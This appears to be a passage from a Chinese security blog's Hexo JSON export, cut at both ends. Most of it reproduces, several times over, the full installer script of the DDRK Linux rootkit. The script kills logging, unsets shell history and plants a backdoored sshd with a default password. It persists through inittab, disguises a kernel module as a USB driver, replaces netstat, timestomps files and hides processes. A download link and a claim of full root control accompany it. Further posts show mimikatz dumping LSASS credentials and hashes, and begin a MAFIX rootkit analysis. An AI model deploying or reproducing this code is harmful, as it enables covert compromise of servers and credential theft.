rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设\n","site":{"data":{}},"excerpt":"","more":"<p></p><p></p><p></p><p>DDRK是一个Linux结合shv和adore-ng优点，内核级别的rootkit。</p><p>DDRK中包含的文件：</p><p>netstat &nbsp;#替换系统中的netstat，从ssh配置文件中读取端口并隐藏</p><p>rk.ko &nbsp;#内核模块，实现文件和进程的隐藏功能</p><p>setup &nbsp;#rootkit安装文件</p><p>tty &nbsp;#ava工具</p><p>bin.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---ttymon</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---sshd.tgz</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;---.sh</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shdcf2 &nbsp;#sshd配置文件</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shhk.pub</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---shrs</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---sshd &nbsp;#sshd主程序</p><p>DDRK下载地址：http://www.sectop.com/soft/ddrk.tgz</p><p>因此只要把这些文件上传到服务器上并成功运行，就可以获得该服务器的root权限。为所欲为，无所不能。</p><p>&nbsp;</p><p>setup内容如下：</p><p>#!/bin/bash</p><p>&nbsp;</p><p>##########define variables##########</p><p>DEFPASS=123456 &nbsp; &nbsp;//默认密码</p><p>DEFPORT=43958 &nbsp; &nbsp;//默认端口</p><p>BASEDIR=`pwd`</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>&nbsp;</p><p>##########check is root##########</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;BECOME ROOT AND TRY AGAIN&quot;</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>&nbsp;</p><p>##########extract all tar##########</p><p>tar zxf bin.tgz</p><p>cd bin</p><p>tar zxf sshd.tgz</p><p>rm -rf ./sshd.tgz</p><p>cd $BASEDIR</p><p>rm -rf bin.tgz</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>##########kill syslogd##########</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>sleep 2</p><p>&nbsp;</p><p>##########remove sh.conf##########</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; rm -rf /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; //经过md5sum加密过的密码文件</p><p>fi</p><p>&nbsp;</p><p>##########initialize sshd configuration##########</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using Password : $1&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No Password Specified, using default - $DEFPASS&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;Using ssh-port : $2&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>else</p><p>&nbsp; &nbsp;echo &quot;No ssh-port Specified, using default - $DEFPORT&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf</p><p>fi</p><p>&nbsp;</p><p>###########creating dirs##########</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/</p><p>mv .sh/.bashrc $HOMEDIR</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload</p><p>chmod a+xr /sbin/ttyload</p><p>chmod o-w /sbin/ttyload</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon</p><p>chmod a+xr /sbin/ttymon</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p>##########modify inittab##########</p><p>cp /etc/inittab /etc/.inittab</p><p>sed -e 's@^1:2345@0:2345:once:/usr/sbin/ttyloadn&amp;@' /etc/inittab &gt; /etc/.inittab</p><p>touch -acmr /etc/inittab /etc/.inittab</p><p>mv -f /etc/.inittab /etc/inittab</p><p>&nbsp;</p><p>echo &quot;/sbin/ttyload -q &gt; /dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>echo &quot;${HOMEDIR}/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>&nbsp;</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod 755 /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /bin/ls /etc/inittab</p><p>&nbsp;</p><p>###########make sure inittab has modified##########</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;# WARNING - SSHD WONT BE RELOADED UPON RESTART &quot;</p><p>&nbsp; &nbsp;echo &quot;# inittab shuffling probly fucked-up ! &quot;</p><p>fi</p><p>&nbsp;</p><p>##########load rk.ko##########</p><p>cd $BASEDIR</p><p>modprobe -r ehci-hcd</p><p>mv -f rk.ko /lib/modules/`uname -r`/kernel/drivers/usb/host/ehci-hcd.ko</p><p>modprobe ehci-hcd</p><p>mv tty $HOMEDIR</p><p>&nbsp;</p><p>##########replace netstat##########</p><p>touch -acmr /bin/netstat netstat</p><p>mv -f netstat /bin/netstat</p><p>&nbsp;</p><p>##########hide all files and process##########</p><p>$HOMEDIR/tty h /etc/sh.conf &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /lib/libsh.so &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/lib/libsh &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /usr/sbin/ttyload &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty h /sbin/ttymon &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttyload` &gt; /dev/null 2&gt;&amp;1</p><p>$HOMEDIR/tty i `pidof ttymon` &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########load rk.ko on boot##########</p><p>cat &gt; /etc/sysconfig/modules/ehci.modules &lt;&lt; EOF</p><p>#!/bin/sh</p><p>#install usb modules support</p><p>modprobe -r ehci-hcd</p><p>modprobe ehci-hcd</p><p>EOF</p><p>touch -amcr /bin/ls /etc/sysconfig/modules/ehci.modules</p><p>&nbsp;</p><p>chmod 755 /etc/sysconfig/modules/ehci.modules</p><p>$HOMEDIR/tty h /etc/sysconfig/modules/ehci.modules &gt; /dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>##########check iptables setting##########</p><p>if [ -f /sbin/iptables ]; then</p><p>&nbsp; &nbsp;echo &quot;`/sbin/iptables -L INPUT | head -5`&quot;</p><p>else</p><p>&nbsp; &nbsp;echo &quot;&quot;</p><p>&nbsp; &nbsp;echo &quot;# lucky for u no iptables found&quot;</p><p>fi</p><p>&nbsp;</p><p>##########start syslogd##########</p><p>/sbin/syslogd -m 0</p><p>&nbsp;</p><p># ./setup 123 3333 &nbsp; &nbsp;//设\n"},{"title":"mimikatz读取密码或者LM HASH","date":"2012-12-19T02:09:00.000Z","_content":"<p><br /></p><p>命令一直忘，记录下来吧。<br /></p><p><br /></p><p>mimikatz&nbsp;1.0&nbsp;x86&nbsp;(alpha)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Traitement&nbsp;du&nbsp;Kiwi&nbsp;(Feb&nbsp;&nbsp;9&nbsp;2012&nbsp;01:46:57)&nbsp;*/<br />//&nbsp;http://blog.gentilkiwi.com/mimikatz<br /><br />mimikatz&nbsp;#&nbsp;privilege::debug<br />Demande&nbsp;d&#39;ACTIVATION&nbsp;du&nbsp;privilège&nbsp;:&nbsp;SeDebugPrivilege&nbsp;:&nbsp;OK<br /><br />mimikatz&nbsp;#&nbsp;inject::process&nbsp;lsass.exe&nbsp;sekurlsa.dll<br />PROCESSENTRY32(lsass.exe).th32ProcessID&nbsp;=&nbsp;1164<br />Attente&nbsp;de&nbsp;connexion&nbsp;du&nbsp;client...<br />Serveur&nbsp;connecté&nbsp;à&nbsp;un&nbsp;client&nbsp;!<br />Message&nbsp;du&nbsp;processus&nbsp;:<br />Bienvenue&nbsp;dans&nbsp;un&nbsp;processus&nbsp;distant<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gentil&nbsp;Kiwi<br /><br />SekurLSA&nbsp;:&nbsp;librairie&nbsp;de&nbsp;manipulation&nbsp;des&nbsp;données&nbsp;de&nbsp;sécurités&nbsp;dans&nbsp;LSASS<br /><br />mimikatz&nbsp;#&nbsp;@getLogonPasswords<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;218411<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ANONYMOUS&nbsp;LOGON<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NT&nbsp;AUTHORITY<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;87064<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Administrator<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;思密达<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;93a4f02839e824417584248b8d2c9f9e&nbsp;},&nbsp;ntlm{&nbsp;d9640e9219<br />712c8788ce086c6db63592&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;123456<br /></p><p><br /></p>","source":"_posts/mimikatz读取密码或者LM-HASH.md","raw":"title: mimikatz读取密码或者LM HASH\ncategories: [网络安全]\ntags: [mimikatz]\ndate: 2012-12-19 10:09:00\n---\n<p><br /></p><p>命令一直忘，记录下来吧。<br /></p><p><br /></p><p>mimikatz&nbsp;1.0&nbsp;x86&nbsp;(alpha)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Traitement&nbsp;du&nbsp;Kiwi&nbsp;(Feb&nbsp;&nbsp;9&nbsp;2012&nbsp;01:46:57)&nbsp;*/<br />//&nbsp;http://blog.gentilkiwi.com/mimikatz<br /><br />mimikatz&nbsp;#&nbsp;privilege::debug<br />Demande&nbsp;d&#39;ACTIVATION&nbsp;du&nbsp;privilège&nbsp;:&nbsp;SeDebugPrivilege&nbsp;:&nbsp;OK<br /><br />mimikatz&nbsp;#&nbsp;inject::process&nbsp;lsass.exe&nbsp;sekurlsa.dll<br />PROCESSENTRY32(lsass.exe).th32ProcessID&nbsp;=&nbsp;1164<br />Attente&nbsp;de&nbsp;connexion&nbsp;du&nbsp;client...<br />Serveur&nbsp;connecté&nbsp;à&nbsp;un&nbsp;client&nbsp;!<br />Message&nbsp;du&nbsp;processus&nbsp;:<br />Bienvenue&nbsp;dans&nbsp;un&nbsp;processus&nbsp;distant<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gentil&nbsp;Kiwi<br /><br />SekurLSA&nbsp;:&nbsp;librairie&nbsp;de&nbsp;manipulation&nbsp;des&nbsp;données&nbsp;de&nbsp;sécurités&nbsp;dans&nbsp;LSASS<br /><br />mimikatz&nbsp;#&nbsp;@getLogonPasswords<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;218411<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ANONYMOUS&nbsp;LOGON<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NT&nbsp;AUTHORITY<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;87064<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Administrator<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;思密达<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;93a4f02839e824417584248b8d2c9f9e&nbsp;},&nbsp;ntlm{&nbsp;d9640e9219<br />712c8788ce086c6db63592&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;123456<br /></p><p><br /></p>","slug":"mimikatz读取密码或者LM-HASH","published":1,"updated":"2023-04-22T05:38:44.831Z","_id":"clgrjlxhv00487opi52be9mqm","comments":1,"layout":"post","photos":[],"link":"","content":"<p><br /></p><p>命令一直忘，记录下来吧。<br /></p><p><br /></p><p>mimikatz&nbsp;1.0&nbsp;x86&nbsp;(alpha)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Traitement&nbsp;du&nbsp;Kiwi&nbsp;(Feb&nbsp;&nbsp;9&nbsp;2012&nbsp;01:46:57)&nbsp;*/<br />//&nbsp;http://blog.gentilkiwi.com/mimikatz<br /><br />mimikatz&nbsp;#&nbsp;privilege::debug<br />Demande&nbsp;d&#39;ACTIVATION&nbsp;du&nbsp;privilège&nbsp;:&nbsp;SeDebugPrivilege&nbsp;:&nbsp;OK<br /><br />mimikatz&nbsp;#&nbsp;inject::process&nbsp;lsass.exe&nbsp;sekurlsa.dll<br />PROCESSENTRY32(lsass.exe).th32ProcessID&nbsp;=&nbsp;1164<br />Attente&nbsp;de&nbsp;connexion&nbsp;du&nbsp;client...<br />Serveur&nbsp;connecté&nbsp;à&nbsp;un&nbsp;client&nbsp;!<br />Message&nbsp;du&nbsp;processus&nbsp;:<br />Bienvenue&nbsp;dans&nbsp;un&nbsp;processus&nbsp;distant<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gentil&nbsp;Kiwi<br /><br />SekurLSA&nbsp;:&nbsp;librairie&nbsp;de&nbsp;manipulation&nbsp;des&nbsp;données&nbsp;de&nbsp;sécurités&nbsp;dans&nbsp;LSASS<br /><br />mimikatz&nbsp;#&nbsp;@getLogonPasswords<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;218411<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ANONYMOUS&nbsp;LOGON<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NT&nbsp;AUTHORITY<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;87064<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Administrator<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;思密达<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;93a4f02839e824417584248b8d2c9f9e&nbsp;},&nbsp;ntlm{&nbsp;d9640e9219<br />712c8788ce086c6db63592&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;123456<br /></p><p><br /></p>","site":{"data":{}},"excerpt":"","more":"<p><br /></p><p>命令一直忘，记录下来吧。<br /></p><p><br /></p><p>mimikatz&nbsp;1.0&nbsp;x86&nbsp;(alpha)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Traitement&nbsp;du&nbsp;Kiwi&nbsp;(Feb&nbsp;&nbsp;9&nbsp;2012&nbsp;01:46:57)&nbsp;*/<br />//&nbsp;http://blog.gentilkiwi.com/mimikatz<br /><br />mimikatz&nbsp;#&nbsp;privilege::debug<br />Demande&nbsp;d&#39;ACTIVATION&nbsp;du&nbsp;privilège&nbsp;:&nbsp;SeDebugPrivilege&nbsp;:&nbsp;OK<br /><br />mimikatz&nbsp;#&nbsp;inject::process&nbsp;lsass.exe&nbsp;sekurlsa.dll<br />PROCESSENTRY32(lsass.exe).th32ProcessID&nbsp;=&nbsp;1164<br />Attente&nbsp;de&nbsp;connexion&nbsp;du&nbsp;client...<br />Serveur&nbsp;connecté&nbsp;à&nbsp;un&nbsp;client&nbsp;!<br />Message&nbsp;du&nbsp;processus&nbsp;:<br />Bienvenue&nbsp;dans&nbsp;un&nbsp;processus&nbsp;distant<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gentil&nbsp;Kiwi<br /><br />SekurLSA&nbsp;:&nbsp;librairie&nbsp;de&nbsp;manipulation&nbsp;des&nbsp;données&nbsp;de&nbsp;sécurités&nbsp;dans&nbsp;LSASS<br /><br />mimikatz&nbsp;#&nbsp;@getLogonPasswords<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;218411<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ANONYMOUS&nbsp;LOGON<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NT&nbsp;AUTHORITY<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n.t.&nbsp;(LUID&nbsp;KO)<br /><br />Authentification&nbsp;Id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0;87064<br />Package&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;NTLM<br />Utilisateur&nbsp;principal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Administrator<br />Domaine&nbsp;d&#39;authentification&nbsp;&nbsp;:&nbsp;思密达<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msv1_0&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lm{&nbsp;93a4f02839e824417584248b8d2c9f9e&nbsp;},&nbsp;ntlm{&nbsp;d9640e9219<br />712c8788ce086c6db63592&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wdigest&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;123456<br /></p><p><br /></p>"},{"title":"MAFIX - Linux 2.6 rootkit分析","date":"2011-06-28T09:35:00.000Z","_content":"<p>MAFIX - Linux 2.6 rootkit</p><p>这后门很贱，服务器中过一次，属于这个后门的改版。那个添加了模块。</p><p>下载地址：</p><p>https://forum.eviloctal.com/attachment.php?aid=13419</p><p>内容：</p><p>MAXFIX</p><p>---HOW-TO</p><p>---mafix</p><p>---mafixlibs &nbsp;</p><p>---root</p><p>&nbsp;</p><p>下面为root的内容，也就是安装脚本。</p><p>#!/bin/bash</p><p>######################</p><p># mafix 0.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p># fud 2009/07/15 &nbsp; &nbsp; #</p><p>######################</p><p>&nbsp;</p><p>BASEDIR=`pwd`</p><p>export 